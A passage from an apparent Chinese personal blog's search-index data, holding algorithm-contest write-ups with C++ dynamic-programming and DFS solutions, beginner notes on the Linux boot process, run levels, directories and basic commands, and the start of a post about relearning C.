将一个数分成一份，那么只有一种情况 dp[i][0] = 0; // 将 0 进行划分，0 种情况。 &#125; for(int i = 0; i &lt;= n; i++) &#123; for(int j = 0; j &lt;= k; j++) &#123; if(i == j) // 将 i 划分成 i 份，只有一种分法 dp[i][j] = 1; else if(i &lt; j) // 将 i 划分为小于本身的份数，将无法划分，情况为0 dp[i][j] = 0; else dp[i][j] = dp[i-j][j] + dp[i-1][j-1]; // 大问题划分为两个子问题。 &#125; &#125; printf( &quot;%d\\n&quot;, dp[n][k] ); return 0;&#125; 样例4：删括号链接：https://ac.nowcoder.com/acm/problem/21303来源：牛客网 题目描述 给你一个合法的括号序列s1，每次你可以删除一个”()” 你可以删除0个或者多个”()” 求能否删成另一个括号序列s2 输入描述:12第一行输入一个字符串s (2 ≤ |s| ≤ 100)第二行输入一个字符串t (2 ≤ |t| ≤ 100 ) 输出描述:12如果可以输出&quot;Possible&quot;否则输出&quot;Impossible&quot; 示例1输入12(())() 输出1Possible 示例2输入12(()())()() 输出1Impossible 备注:123子任务1: |s| &lt;= 10子任务2: |s| &lt;= 20子任务3: 无限制 思路 设 dp[ i ] [ j ] = true 表示 s1 中下标 0 ~ i-1 的字串，通过删除若干个 “()” ，可以得到 s2 中下标为 0 ~ j-1 的字串。 反之，如果 dp[ i ] [ j ] = false , 表示不能得到。 dp 类型为 bool 二维数组。 我们需要求出二维数组 dp 的每一行，在求第 i 行、第 j 列的时候，前面第 0 ~ i-1 行都是已知状态，可以利用前面来推导当前的状态。 将 s1 的第 i 个字符，和 s2 的第 j 个字符进行比较，会有几种情况发生： 情况1：两者不同： 如果 s1 此时为 左括号，那就先不管，因为此时无法进行删除 “()” 一组括号。dp[ i ] [ j ] 默认为 false 如果 s2 此时为 右括号，那就进行删除 “()” 操作，删除成对数量的 “()” ，dp[ i ] [ j ] 的状态，就等于 dp[ i-k ] [ j ] 的状态。其中，k 表示进行删除操作后，i 值向前的偏移量。这样子，就实现了将问题向前推的转化。 情况2：两者相同： 两者相同的话，dp[ i ] [ j ] 状态，直接就是， dp[ i-1 ] [ j-1 ]。 但是，如果 s1 此时为右括号仍然需要进行删除 “()” 操作。排除 dp[ i-1 ] [ j-1 ] 为 false ，但是删除若干个 “()” 后，dp[ i-k ] [ j ] 为真的情况。 总结 对于 “()” 括号对合法的字符串，可以从一端删除数量相同的左括号，与右括号。 得到的字符串，必然还是成对合法的”()”字符串。 :sob: 我是菜鸡，这种题解析看得都不是很懂，更别所独立想到用 dp 做出来了，哎…… 代码12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;string&gt;#include &lt;cstring&gt;using namespace std;int main()&#123; string s1; string s2; cin &gt;&gt; s1 &gt;&gt; s2; int len1 = s1.length(); int len2 = s2.length(); bool dp[105][105]; memset(dp, false, sizeof(dp)); dp[0][0] = true; for( int i = 1; i &lt;= len1; i++ ) &#123; for( int j = 1; j &lt;= len2; j++ ) &#123; if(s1[i-1] == s2[j-1]) dp[i][j] |= dp[i-1][j-1]; if(s1[i-1] == &#x27;)&#x27;)&#123; int cnt = 1; int k = i; while(cnt)&#123; if(s1[k-1]==&#x27;)&#x27;) cnt++; else cnt--; k--; &#125; dp[i][j] |= dp[k][j]; &#125; &#125; &#125; if(dp[len1][len2]) cout &lt;&lt; &quot;Possible&quot; &lt;&lt; endl; else cout &lt;&lt; &quot;Impossible&quot; &lt;&lt; endl; return 0;&#125; 样例5：划分题目描述：小河认为一个数组是强大的，当且仅当其中所有数字的和不小于 l 且不大于 r。 他得到了一个长度为 n 的数组，希望从中划分出若干个强大的连续子数组。比如，对于数组 [1,−2,−3,4] 以及 l=r=1，可以划分出 [1],[−3,4] 两个满足条件的强大的连续子数组。 小河是贪心的。他希望知道，对于给定的数组，最多能够划分出多少个强大的连续子数组。注意，并不一定要用到数组中的每一个数。 输入格式本题包含多组数据。 第一行一个整数 T(1≤T≤5×103) 表示数据组数。 对于每组数据，第一行三个数字n,l,r(1≤n≤5×103,−109≤l≤r≤109)，表示数组长度和强大的数组所要求的和的最小值及最大值。 接下来一行包含数组中的n个数字a1,a2,…,a**n(∣a**i∣≤109)。 题目保证 ∑n≤5×103。 输出格式对于每组数据，输出一行一个整数，即最多能分割出的强大子数组的个数 样例输入123110 2 10-1 2 -3 4 -5 6 -7 8 -9 10 样例输出15 思路这道题用动态规划，假设我们以及知道 [1, i-1] 区间最大的划分数 dp[i-1] 为多少。 那么 dp[i] 至少会有 dp[i-1] 这么多。 再考虑多出的数字 a[i] 能不能组成新的满足条件的分组。也就是枚举以 a[i] 结尾的连续区间有哪些？我们可以枚举所有可能的左端点 1 到 i-1 。组成区间 [1, i] 或 [2, i] 或 [3, i] … [i-1, i] 。 然后计算每个区间的和，是否满足条件。如果满足条件，那么说明我们需要这个区间，组成一种划分情况。dp[i] 可能等于 dp[j-1] + 1 ， 其中，dp[j-1] 是除去最后一个区间，数组剩余数字能够得到的最大划分数。 j 从 1-i ，计算每种情况所得到的结果，取最大值，就是 dp[i] 总结动态规划，很多时候，一维dp。主问题，可能会引出 i-1 个子问题。不是对于每一个子问题都要写一个转移公式。 而是，循环判断每一个子问题所得到的结果。拿出来做比较，得到最大的，最优的那一个，就是我们所需要的主问题答案。 所以，一般一维dp，也会嵌套循环两个 for 代码12345678910111213141516171819202122232425262728293031323334#include &lt;bits/stdc++.h&gt;using namespace std;typedef long long ll;const int N = 5e3+10;ll p[N];ll a[N];int dp[N]; // 1-i 区间的数组，最多的划分数int main()&#123; int t; int n, l, r; scanf(&quot;%d&quot;, &amp;t); while(t--) &#123; scanf(&quot;%d%d%d&quot;, &amp;n, &amp;l, &amp;r); for(int i = 1; i &lt;= n; i++) &#123; scanf(&quot;%lld&quot;, &amp;a[i]); p[i] = p[i-1]+a[i]; //预处理出前缀和，方便得到区间和 &#125; for(int i = 1; i &lt;= n; i++) &#123; dp[i] = dp[i - 1]; for(int j = 1; j &lt;= i; j++) //判断 [j-i] 区间是否满足条件 &#123; ll tmp = p[i] - p[j-1]; if(tmp &gt;= l &amp;&amp; tmp &lt;= r) /// 如果满足，求最大 dp[i] = max(dp[i] , dp[j-1]+1); &#125; &#125; printf(&quot;%d\\n&quot;, dp[n]); &#125; return 0;&#125; 相关参考链接一篇比较详细的入门介绍 有关数的划分（dp）各种变式","link":"","tags":[{"name":"ACM","slug":"ACM","permalink":"http://www.fangning.xyz.com/tags/ACM/"}]},{"title":"DFS","date":"2020-10-07T11:43:30.000Z","path":"2020/10/07/2020.10.07 DFS深搜/","text":"题1 ：送外卖链接：https://pre.ac.nowcoder.com/acm/problem/13224来源：牛客网 时间限制：C/C++ 1秒，其他语言2秒 空间限制：C/C++ 32768K，其他语言65536K 64bit IO Format: %lld 题目描述n 个小区排成一列，编号为从 0 到 n-1 。一开始，美团外卖员在第0号小区，目标为位于第 n-1 个小区的配送站。 给定两个整数数列 a[0]a[n-1] 和 b[0]b[n-1] ，在每个小区 i 里你有两种选择： 选择a：向前 a[i] 个小区。 选择b：向前 b[i] 个小区。 把每步的选择写成一个关于字符 ‘a’ 和 ‘b’ 的字符串。求到达小区n-1的方案中，字典序最小的字符串。如果做出某个选择时，你跳出了这n个小区的范围，则这个选择不合法。• 当没有合法的选择序列时，输出 “No solution!”。• 当字典序最小的字符串无限长时，输出 “Infinity!”。• 否则，输出这个选择字符串。 字典序定义如下：串s和串t，如果串 s 字典序比串 t 小，则• 存在整数 i ≥ -1，使得∀j，0 ≤ j ≤ i，满足s[j] = t[j] 且 s[i+1] &lt; t[i+1]。• 其中，空字符 &lt; ‘a’ &lt; ‘b’。 输入描述:12345输入有 3 行。第一行输入一个整数 n (1 ≤ n ≤ 10^5)。第二行输入 n 个整数，分别表示 a[i] 。第三行输入 n 个整数，分别表示 b[i] 。−n ≤ a[i], b[i] ≤ n 输出描述:1输出一行字符串表示答案。 示例1输入12375 -3 6 5 -5 -1 6-6 1 4 -2 0 -2 0 输出1abbbb 思路 刷题的时候，牛客把这题归类到 BFS。但是实际上用 DFS 最佳。 如何达到字典序列最小？ 如果是广搜，需要比较每次搜索结果得到的字符串大小。bfs搜索过程: a, b, aa, ab, ba, bb, aba, abb, baa, bab……. 如果是用深搜，第一次搜索到的结果就是最优的。dfs过程: aaaaa, aaaab, aaaa, aaab, aaa, aab……… 显然，直接用深搜。 如何判断是否存在最优答案是无限长的？ 如果一个点结果两次，并且能达到最后的终点，那就是答案无限长。比如: aaaaaaaa…aaaab 加各 vis[] 数组，统计结果点的次数就好了。 AC代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include&lt;bits/stdc++.h&gt;using namespace std;const int N = 1e5+5;int a[N], b[N], vis[N]; // vis 用来标记搜索经过次数int n;string ans; // 记录字典序最优的答案bool f = false; // 判断是否有环，有 true ， 无 falsebool dfs( int pos ) //当前位置 pos&#123; if(pos &lt; 1 || pos &gt; n) return false; //先判是否超界 if(pos == n) // 再判当前位置是否满足条件 return true; if(vis[pos] &gt; 1) return false; // 在判到达当前位置时，是否形成了环 vis[pos]++; // 统计经过该 pos 次数 if( dfs(pos + a[pos]) )&#123;// 遍历另外两位置，如果子路径搜索到答案了，那么父路径返回 true ans += &#x27;a&#x27;; if(vis[pos] &gt; 1) f = true;//子路径递归结束后，再判断该点经过的次数，大于1次拿肯定有环 return true; &#125; if( dfs(pos + b[pos]) )&#123; ans += &#x27;b&#x27;; if(vis[pos] &gt; 1) f = true; return true; &#125; return false; // 以上所有情况都没能返回 true，所以不存在路径。&#125;int main()&#123; scanf(&quot;%d&quot;, &amp;n); for(int i = 1; i &lt;= n; i++) scanf(&quot;%d&quot;, &amp;a[i]); for(int i = 1; i &lt;= n; i++) scanf(&quot;%d&quot;, &amp;b[i]); if( dfs(1) ) //是否可以搜索到最后一个小区？ &#123; if(f) puts(&quot;Infinity!&quot;); //搜索过程中是否经历一个小区两次及以上？ else &#123; reverse(ans.begin(), ans.end()); cout&lt;&lt;ans&lt;&lt;endl; &#125; &#125; else puts(&quot;No solution!&quot;); return 0;&#125; 代码解释 string 类字符串的逆转方法： reverse( string.begin(), string.end() ); 执行完该语句后，string 字符串被逆转。 为什么要将答案逆转输出？ 因为递归时，最外层的函数，最后才结束。 所以，ans 在赋值的时候，是从搜索末端，赋值到搜索开始层。所以答案是反的。 递归的思想，看上去很难，实际上我们只需要在意最外层，也就是当前节点所在位置的判断就行了。 就像 动态规划一样，一个大的问题，可以由两个小子问题得到。 搜索中，当前层次的结果，由多个下一层的搜索结果返回。 题目2：周游世界pta题目链接30分 题解参考链接 题目描述周游世界是件浪漫事，但规划旅行路线就不一定了…… 全世界有成千上万条航线、铁路线、大巴线，令人眼花缭乱。所以旅行社会选择部分运输公司组成联盟，每家公司提供一条线路，然后帮助客户规划由联盟内企业支持的旅行路线。本题就要求你帮旅行社实现一个自动规划路线的程序，使得对任何给定的起点和终点，可以找出最顺畅的路线。所谓“最顺畅”，首先是指中途经停站最少；如果经停站一样多，则取需要换乘线路次数最少的路线。 输入格式：输入在第一行给出一个正整数N（≤100），即联盟公司的数量。接下来有N行，第i行（i=1,⋯,N）描述了第i家公司所提供的线路。格式为： M S[1] S[2] ⋯ S[M] 其中M（≤100）是经停站的数量，S[i]（i=1,⋯,M）是经停站的编号（由4位0-9的数字组成）。这里假设每条线路都是简单的一条可以双向运行的链路，并且输入保证是按照正确的经停顺序给出的 —— 也就是说，任意一对相邻的S[i]和S[i+1]（i=1,⋯,M−1）之间都不存在其他经停站点。我们称相邻站点之间的线路为一个运营区间，每个运营区间只承包给一家公司。环线是有可能存在的，但不会不经停任何中间站点就从出发地回到出发地。当然，不同公司的线路是可能在某些站点有交叉的，这些站点就是客户的换乘点，我们假设任意换乘点涉及的不同公司的线路都不超过5条。 在描述了联盟线路之后，题目将给出一个正整数K（≤10），随后K行，每行给出一位客户的需求，即始发地的编号和目的地的编号，中间以一空格分隔。 输出格式：处理每一位客户的需求。如果没有现成的线路可以使其到达目的地，就在一行中输出“Sorry, no line is available.”；如果目的地可达，则首先在一行中输出最顺畅路线的经停站数量（始发地和目的地不包括在内），然后按下列格式给出旅行路线： 123Go by the line of company #X1 from S1 to S2.Go by the line of company #X2 from S2 to S3....... 其中Xi是线路承包公司的编号，Si是经停站的编号。但必须只输出始发地、换乘点和目的地，不能输出中间的经停站。题目保证满足要求的路线是唯一的。 输入样例：1234567891047 1001 3212 1003 1204 1005 1306 77979 9988 2333 1204 2006 2005 2004 2003 2302 200113 3011 3812 3013 3001 1306 3003 2333 3066 3212 3008 2302 3010 30114 6666 8432 4011 130643011 30136666 20012004 30012222 6666 输出样例：12345678910112Go by the line of company #3 from 3011 to 3013.10Go by the line of company #4 from 6666 to 1306.Go by the line of company #3 from 1306 to 2302.Go by the line of company #2 from 2302 to 2001.6Go by the line of company #2 from 2004 to 1204.Go by the line of company #1 from 1204 to 1306.Go by the line of company #3 from 1306 to 3001.Sorry, no line is available. 思路 题目大意就是很多条地铁线，每条地铁线会经过地铁站。两条相交的地铁线中间的交点站，可以更换线路，也即是换成。要求从起始地，到目的地。经过的地铁站数最少，如果多条线路到达时经过的地铁站数目一样多，那就比较换乘的次数（需要最少）。 题目输出很麻烦，需要记录路径所经过的地铁线编号，以及地铁站编号。 如果没有可达的线路，需要输出指定的字符串。 dfs 函数三参数，起点，终点，以及经过的地铁站数。 每次递归，地铁站数目 + 1。 经过的地铁站，用 vis 数组标记，下次就别搜索了。 递归出口，起点 == 终点，用 cnt 更新全局 minCnt。 如果，cnt == minCnt 比较换乘次数，与minTran最小换乘次数大小。 如何得到换乘次数呢？需要我们搜索过程中，记录中间路径。 也即是用 vector 每次添加经过的地铁站编号。递归结束后在 .pop_back() 删掉。 这样保证每一次到达递归出口，都有一个唯一的线路 vector 。 我们需要最优线路，所以需要弄个最终 path 来保存。该值可以动态更新，和 minCnt , minTran一样。vector 对象之间可以直接用 = 号赋值。 如何存储地铁线路呢？图的存储一般两种，接邻矩阵，接邻表。 接邻矩阵开销大，对于离散的点，不好存。所以用接邻表。 接邻表要用指针，太麻烦。所以直接用 c++ 容器 vector 类型的数组。vectorv[maxn] 声明符 [] 决定了 v 是一个数组，类型符 vector 标识数组每一个元素是一个 vector 类型的对象。 这样子，v[pos] 标，表示每一个地铁站编号，元素值表示与该地铁站相连的其他若干个地铁站编号。 与接邻表一个意思。 如何知道，两个地铁站之间的边，是属于哪一条地铁线呢？ 用 map 做映射，将两条端点的编号弄进去，映射出一个地铁线编号。 map只能做 1对1映射，2对1不行，所以需要将两个数字 hash 映射成一个数字。 如何 hash？数字1作为高四位，数字2作为低四位，就组成了唯一的一个8位数字了。 总结 可以用二维 vector 模拟接邻表。 可以自定义一种 hash 映射方法，配合 map 映射。将离散的节点，变成不离散的节点。 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137#include &lt;bits/stdc++.h&gt;#include &lt;cmath&gt;#define mem(a, b) memset( a, b, sizeof(a) )#define ssclr(ss) ss.clear(),ss.str(&quot;&quot;)#define f(x, y, z) for( int x = (y), __ = (z); x &lt; __; ++x )#define INF 0x3f3f3f3f#define MOD 1000000007//namespace solve&#123; &#125;using namespace std;typedef long long ll;const int maxn = 1e4+10;int minCnt, minTran; // 两个代价，都需要最小int vis[maxn]; //搜索表记数组unordered_map&lt;int, int&gt; Line;vector&lt;int&gt; v[maxn], tpath, path;int ToLine(int x, int y); // hash 映射边int TranCnt(); // 计算路径换乘次数// 搜索出最优路径，保存到 path 中。中间过程存放到 tpath。// 使用二维 vector&lt;int&gt;v[maxn] 模拟接邻表，进行搜索。使用数组，对已搜索点标记。void dfs(int s, int e, int cnt);void putAns(); // 按格式输出 pathint main()&#123; int n, m, pre; scanf(&quot;%d&quot;, &amp;n); f(i, 1, n+1) &#123; scanf(&quot;%d%d&quot;, &amp;m, &amp;pre); int id; f(j, 1, m) &#123; scanf(&quot;%d&quot;, &amp;id); //存每一条道路 v[pre].push_back(id); v[id].push_back(pre); //每一道路所属联盟 Line[ToLine(pre, id)] = Line[ToLine(id, pre)] = i; pre = id; &#125; &#125; int t; scanf(&quot;%d&quot;, &amp;t); int s, e; while(t--) &#123; scanf(&quot;%d%d&quot;, &amp;s , &amp;e); //搜索前初始化所有 mem(vis, 0); tpath.clear(); minCnt=minTran=INF; //进行搜索 vis[s] = 1; tpath.push_back(s); dfs(s, e, 1); tpath.pop_back(); vis[s] = 0; //判断是否得到最优结果 if(minCnt == INF) printf(&quot;Sorry, no line is available.\\n&quot;); else putAns(); &#125; return 0;&#125;void dfs(int s, int e, int cnt)&#123; if( s==e &amp;&amp; ( cnt &lt; minCnt || (cnt == minCnt &amp;&amp; TranCnt() &lt; minTran) ) ) &#123; path = tpath; // 这个赋值我是真的不知道，vector复制还可以这么玩 minCnt = cnt; minTran = TranCnt(); &#125; if(s==e) return; //搜索到终点，但是代价不满足，舍弃 int len = v[s].size(); f(i, 0, len) &#123; int s2 = v[s][i]; if(!vis[s2]) &#123; vis[s2] = 1; tpath.push_back(s2); dfs(s2, e, cnt+1); tpath.pop_back(); vis[s2] = 0; &#125; &#125;&#125;//计算边的唯一标识，自定义 hash 映射规则。int ToLine(int x, int y)&#123; return x*10000+y; // x: 起点 y: 终点&#125;int TranCnt()&#123; int pre =0 , cnt = -1; int cur; int len = tpath.size(); f(i, 1, len) &#123; cur = Line[ ToLine(tpath[i-1], tpath[i]) ];//计算当前边的所属联盟编号 if(cur != pre)//如果当前边，与上一条边不同属一个联盟 &#123; pre = cur; cnt ++; &#125; &#125; return cnt; // 返回当前路径所换乘的次数。&#125;void putAns()&#123; printf(&quot;%d\\n&quot;, minCnt-1); // 不包括 起始，终止站，所以减2 int len = path.size(); int pre = path[0]; //记录下起点 int pre_id = Line[ ToLine(path[0], path[1]) ], cur_id; //记录下第一段路线所属联盟号 f(i, 2, len) &#123; cur_id = Line[ ToLine(path[i-1], path[i]) ]; if(cur_id != pre_id)&#123; printf(&quot;Go by the line of company #%d from %04d to %04d.\\n&quot;, pre_id, pre, path[i-1]); pre_id = cur_id; pre = path[i-1]; &#125; &#125; printf(&quot;Go by the line of company #%d from %04d to %04d.\\n&quot;, pre_id, pre, path[len-1]);&#125; 题目3：七段码该题为第十一届蓝桥杯省赛C/C++B组第5道填空题。基本上，会做这道题，省一没啥问题的。 不过蓝桥杯省一没啥用，国二及以上才有点儿用吧。 题目描述小蓝要用七段码数码管来表示一种特殊的文字。 七段码上图给出了七段码数码管的一个图示，数码管中一共有7 段可以发光的二极管，分别标记为a, b, c, d, e, f, g。小蓝要选择一部分二极管（至少要有一个）发光来表达字符。在设计字符的表达时，要求所有发光的二极管是连成一片的。 例如：b 发光，其他二极管不发光可以用来表达一种字符。例如：c 发光，其他二极管不发光可以用来表达一种字符。这种方案与上一行的方案可以用来表示不同的字符，尽管看上去比较相似。例如：a, b, c, d, e 发光，f, g 不发光可以用来表达一种字符。例如：b, f 发光，其他二极管不发光则不能用来表达一种字符，因为发光的二极管没有连成一片。请问，小蓝可以用七段码数码管表达多少种不同的字符？ 思路直接使用深度搜索。 把数码管每一段看成一个点，相邻表示相连。一共七个点。相邻的话，加一条双向边。可以用二维 vector 来存点，与边的信息。 然后暴力从每个点开始，搜索相应的深度，得到一条路径。 去重： 同一深度的搜索结果，路径可能经过的数码管段，是一样的，比如a-b，和b-a。可以将搜索结果（是一个集合）加到 set 集合内，进行去重。 也就是用集合的集合。set&lt; set &gt; ss。 ss 中每一个集合都是不重复的，所以不存在 a-b ， b-a 的情况。 总结 可以使用集合的集合存储搜索结果。 set的一些方法：set.insert(x) , set.erase(x) , set.clear() , set.size() 。 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;bits/stdc++.h&gt;using namespace std;set&lt;int&gt; s;set&lt;set&lt;int&gt;&gt; ss;vector&lt;int&gt; v[10];bool vis[10];void putadge(int a, int b)&#123; v[a].push_back(b); v[b].push_back(a);&#125;void dfs(int st, int Cnt , int step)&#123; if(step == Cnt) &#123; ss.insert(s);//搜索路径虽然有重复，可以用集合的集合进行去重 return; &#125; if(step &gt; Cnt) return; for(auto X:v[st]) &#123; if(!vis[X]) &#123; vis[X] = true; s.insert(X); dfs(X, Cnt, step+1); s.erase(X); vis[X] = false; &#125; &#125;&#125;int main()&#123; putadge(1, 2); putadge(1, 6); putadge(2, 3); putadge(2, 7); putadge(3, 4); putadge(3, 7); putadge(4, 5); putadge(5, 6); putadge(5, 7); putadge(6, 7); //以 i 开始，搜索深度为 j for(int i = 1; i &lt;= 7; i++) &#123; for(int j = 1; j &lt;= 7; j++) &#123; s.clear(); memset(vis, 0, sizeof(vis)); vis[i] = true; s.insert(i); dfs(i, j, 1); &#125; &#125; cout &lt;&lt; ss.size() &lt;&lt; endl; return 0;&#125;","link":"","tags":[{"name":"ACM","slug":"ACM","permalink":"http://www.fangning.xyz.com/tags/ACM/"}]},{"title":"Linux 概述","date":"2020-10-02T04:03:30.000Z","path":"2020/10/02/2020.10.02 Linux概述/","text":"Linux概述 Linux ———— 一种开源操作系统 内核版本号组成，r.x.y r ： 目前发部的内核版本 x : 偶数 表示稳定版本，奇数表示开发中版本 z : 错误修补次数 比较流行的版本 分为商业版， 以及社群版 Red Hat Mandrake Slackware Debian CentOS ———— 本人主要学习该版本的 Linux Ubuntu WMware 中安装 Linux参考资料: bilbili 最详细教学 千言万语都在视频里，我就不多累赘了 先查看自己 VMware 可支持安装的 Linux 各版本号，然后再对应的去官网下载 Linux ios Linux 系统w免费，直接官网下载，无需激活 建议安装 CentOS。我用 VMware 15 装了 CentOS 8，由于 CentOS 是由 Red-Hat 发展来的，所以采用了 VMware 中的 red-hat 8 来装 CentOS 8 完全没问题 安装过程很简单，用过 VMware 的应该都不难。 计算机启动基本过程详情参考： 计算机启动过程 进程：进程（Process）是计算机中的程序关于某数据集合上的一次运行活动，是系统进行资源分配和调度的基本单位，是操作系统结构的基础。 进程 = 程序 + 数据 + 系统硬件运行资源 123456789101112131415161718192021222324251. 按下电源键: 1) 上电，CPU 复位后开始工作 2) 执行跳转指令，跳转到 存储有 BIOS 程序的 ROM 中。2. BIOS自检: 1) 现在存储 BIOS 的存储器使用 Flash EPROM 这种可用擦写工具修改的芯片。 2) BIOS ------- Baic Input/Output System 基本输入输出系统 3) 该系统程序的主要作用: * 硬件自检：检查 cpu、内存、显卡、I/O、键盘鼠标等是否上电正常。 * 查找引导设备：BIOS将控制权交给启动程序。&quot;启动顺序&quot;可进入bios进行修改。3. 系统引导: 1) boot 启动的意思，bootloader 启动程序 2) bios 运行结束后，运行 MBR（主引导记录）: 另外一个引导程序，NTLDR、BOOTMGR、GRUB(启动管理器)等等 3) 计算机控制权转交给硬盘的某个分区 * 如果操作系统位于激活的主分区（主分区有四个，只能激活一个）内，计算机读取激活分区的第一个扇区。 * 如果操作系统位于逻辑分区内，也就是扩展分区（四个主分区内，的再分区）。计算机读取 “启动管理器”程序代码，直接提示用户选择启动哪个操作系统。—————— Linux 主要使用 GRUB 启动管理器。 # 对于嵌入式 系统来说，并没有 BIOS ，而是直接从 flsh 照顾你运行 bootloader启动程序 . 4. 启动内核: 1) 控制权给了操作系统，操作系统内核被加载到内存运行。 2) Linux 中，先运行 /boot 目录下内核文件 3) 第一个运行的程序是 /sbin/init ，该程序工具配置文件产生 init 进程 ———— Linux 第一个进程 PID = 1 4) init 进程产生其他的后代进程，加载系统各个模块，直到加载到 /bin/login 登陆程序，跳出登陆界面。 Shell shell 俗称 壳，是用户与 Linux 的接口。区别于内核 Shell 有图形 GUI 形式的 ， 也有 命令行的。 命令行模式下又分: 交互模式，类似 cmd.exe 非交互模式，类似批处理文件，Windows下的 .bat ，Linux下的 .sh 常见的Shell Linux 下 Shell 可能不同。也就是各种不同的标准 Bourne Shell \\ Korn shell \\ C Shell \\ Bourne Again Shell 等等 图形界面以及字符界面的切换 图形界面也就是 X-Windows 模式，Linux 系统默认开机进入 X-Windows 屏幕 tty2 当然，同时，Linux 还开起了其他六个 字符界面 屏幕 tty1，tty3-tty7 使用 ctrl + alt + Fn 可以在 各个屏幕之间切换。 注意如果是 VMware 中使用该快捷键，会与 VMware 本身的 ctrl + alt 快捷键冲突，需要修改 VMware 的快捷键。 编辑 -&gt; 习惯设置(preference) -&gt; 热键 改为 alt + shift + ctrl 完全退出 X-Windows在图形界面中，打开一个终端（ terminal 一个黑乎乎的命令行），然后输入 init 3，强行关闭图形界面，然后转到字符界面。 修改完运行级后，X-Windows 不再运行。 如需重启 x-windows 需要切换运行级到5 ———— init 5 环境变量 环境变量，指操作系统中用来指定操作系统运行环境的一些变量 系统级环境变量 对登陆系统的所有用户有效 存储位置：/etc/profilt 查看命令 env 用户级环境变量 对指定登陆的用户有效 存储位置: ~/.bash_profile 文件，其中 ~ 指用户目录，类似 windows 的 %userprofilt% .bash_profile 为一个隐藏文件 查看命令 env 了解 Linux 系统信息123456789101112131415161718192021221. [root@CentOS-1 /root]# 1) root : 表示当前登陆的身份。 2) CentOS-1 : 表示你给你的 Linux 取的主机名。 3) /root : 此处为当前路径，有时为 &#x27;~&#x27; 表示用户家目录。 4) &#x27;#&#x27; : 表示此时登陆的身份为超级管理员，&#x27;$&#x27; 表示普通用户。2. 查看硬盘信息: 1) fdisk -l 2) 会出现一堆信息，主需要在乎 &#x27;disk /dev/sda: 21.5G&#x27; # divice设备文件存放目录 3) &#x27;sda&#x27; 表示硬件在 Linux 系统中的&#x27;名称&#x27;，&#x27;sd&#x27; 表示硬盘所用为 &#x27;sata 接口&#x27;，&#x27;a&#x27; 表示&#x27;第一块&#x27;硬盘。3. 查看内存信息: 1) cat /proc/meminfo # concatenate连锁，cat file1 file2 &gt;&gt; file3 将文件1和文件2联合起来放到file34. 查看 cpu 信息: 1) cat /proc/cpuinfo # cat 可用来输出文件信息 2) 查看型号，主频，型号，产商 就行了5. 关机/重启: 1) 关机: poweroff 2) 重启: reboot 了解 Linux 目录结构和文件属性12345678910111213141516171819201. &#x27;/&#x27; : 表示根目录2. 和 Windows 一样，都是采用树状结构。3. 文件组织架构信息: 1) /bin ------ &#x27;系统命令字&#x27; ， 普通用户 &amp; root 都可以使用的命令！ # binaries 二进制文件 2) /sbin ------ &#x27;root&#x27; 专用&#x27;命令字&#x27;，比如开关机/重启，poweroff / reboot # superuser binaries 3) /boot ------ &#x27;引导&#x27;的意思，操作系统主引导目录。特点：独立的分区，有系统启动菜单，以及内核。 4) /dev ------ &#x27;device设备&#x27;，设备文件存放目录 # device 5) /etc ------ &#x27;配置文件&#x27;存放目录 # ETCetera 6) /home ------ &#x27;普通用户&#x27;家目录 7) /root ------ &#x27;超级管理员&#x27;的家目录 8) /lib , /lib64 ----- 一些&#x27;函数库&#x27;的存放路径 # libaray 9) /media ------ &#x27;光驱&#x27;的挂载目录，&#x27;挂载&#x27;：就是将一切和文件夹联系起来，一切皆文件 10) /mnt ------ &#x27;临时设备&#x27;的挂载目录，比如说 U盘文件，就在这里面。 11) /proc ------ process&#x27;进程&#x27;，该目录中所有的&#x27;数据都在内存中&#x27;。 12) /tmp ------ &#x27;临时文件&#x27;存放目录。 # tmporary 临时 13) /usr ------ &#x27;第三方软件&#x27;按照目录。 # unix shared resources 14) /var ------ 变量的意思，存放常变文件目录，比如&#x27;日志，邮件文件&#x27;。 # variable 变量 相关命令123456789101112131415161718192021222324252627282930313233343536373839401. uname -a 或 cat/proc/version 1) 查看当前系统版本号2. #echo $SHELL 1) 查看当前环境所用 Shell 标准，eg: #/bin/bash3. init [x]: # 初始化 1) 切换 Linux 运行级 2) 0: 停机 1: 单用户模式 2: 多用户，无 NFS 3: 完全多用户模式，标准运行级，&#x27;字符界面模式&#x27; 4: 一般不用 5: X-Window 系统，&#x27;图形界面模式&#x27; 6: 重启 # 系统默认开机 init 3 进入图形界面 # 可修改 /etc/inittab 文本文件中的 id:5:initdefault 为 id:3:initdefault # 这样子一开机就进入 3 运行级，也就是字符界面模式 4. ls -a # list all 1) 查看当前目录下的隐藏文件5. env: # enviroment 1) 查看当前系统的环境变量6. cd .. # change directory 1) 同 windows 表示返回上一级目录。7. pwd # print work directory 1) 显示当前路径。8. ls # list 1) 列出当前路径目录。9. clear 1) 清空当前屏幕，保留列出的信息，实际上只是将屏幕滚动了一页。10. reset 1) 完全清空当前屏幕。 相关经验 多实践，遇到问题学会自己查看错误讯息，或日志 /var/log Linux 网路功能很强。 熟练掌握 LInux 之后再玩架站。 注意 网络安全 这一点很重要。 架设安全的 Linux 主机 限制 Linux 主机的连线电脑 更改 wu-ftp 成为 proftp 系统 简单的防火墙设置 Linux 的套件升级。 在 LInux 系统中，一切皆文件，都有路径与文件名 Windows 下路径采用 反斜杠 \\ ，，， Linux 下采用斜杠 / 相关资料 鸟哥的 Linux 私房菜：新手建议 Linux C与C++ 一线开发实践 千峰网络安全课程 之 CentOS 基本使用 Linux 相关英文指令缩写含义 ========================== 好好学习，然后，出去好好玩，逛一逛，看一看 =========================","link":"","tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.fangning.xyz.com/tags/Linux/"}]},{"title":"重拾C语言","date":"2020-10-01T09:33:40.000Z","path":"2020/10/01/2020.10.01 重拾C语言/","text":"重拾C语言前言：​ 可以看到，今天的日期是 10/1 号，国庆节，没做。而且也是中秋节呢！然而，苦逼我今天并没有放下心情来好好享受这美好的假期。因为心里一直在苦恼，纠结着，接下来的大三生活该如何走。 ​ 